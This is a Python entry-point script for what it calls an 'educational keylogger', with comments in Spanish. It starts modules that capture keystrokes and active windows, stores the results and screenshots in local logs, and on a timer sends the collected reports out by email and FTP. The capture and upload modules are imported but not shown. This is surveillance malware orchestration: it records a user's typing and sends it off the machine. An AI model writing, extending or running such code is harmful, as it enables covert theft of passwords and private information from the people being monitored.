import time
import os
import sys
from modules.key_monitor import KeyMonitor
from modules.window_monitor import WindowMonitor
from modules.storage_manager import StorageManager

def main():
    # Rutas base
    base_dir = os.path.dirname(os.path.abspath(__file__))
    logs_dir = os.path.join(base_dir, "logs")
    screenshot_dir = os.path.join(logs_dir, "screenshots")
    config_path = os.path.join(base_dir, "config.json")
    
    # Crear directorios si no existen
    os.makedirs(logs_dir, exist_ok=True)
    os.makedirs(screenshot_dir, exist_ok=True)
    
    # Inicializar Storage
    storage = StorageManager(config_path, logs_dir)
    
    # Callback para guardar datos (teclas y ventanas)
    def save_data(data):
        print(data, end="", flush=True) # Para debug en consola
        storage.save_local(data)
    
    # Inicializar Monitores
    key_monitor = KeyMonitor(callback=save_data)
    window_monitor = WindowMonitor(callback=save_data, screenshot_dir=screenshot_dir)
    
    print("=== Keylogger Educativo Iniciado ===")
    print(f"Guardando logs en: {logs_dir}")
    print("Presiona Ctrl+C para detener.")
    
    try:
        key_monitor.start()
        window_monitor.start()
        
        # Bucle principal para tareas periódicas (ej: Email)
        email_interval = storage.config.get("options", {}).get("send_email_interval", 300)
        last_email_time = time.time()
        
        while True:
            time.sleep(1)
            
            # Revisar si toca enviar email
            if time.time() - last_email_time > email_interval:
                print("\n[Main] Iniciando envío de reporte...")
                storage.send_email()
                storage.upload_ftp() # Intentar FTP también
                last_email_time = time.time()
                
    except KeyboardInterrupt:
        print("\nDeteniendo servicios...")
        key_monitor.stop()
        window_monitor.stop()
        print("Finalizado.")

if __name__ == "__main__":
    main()
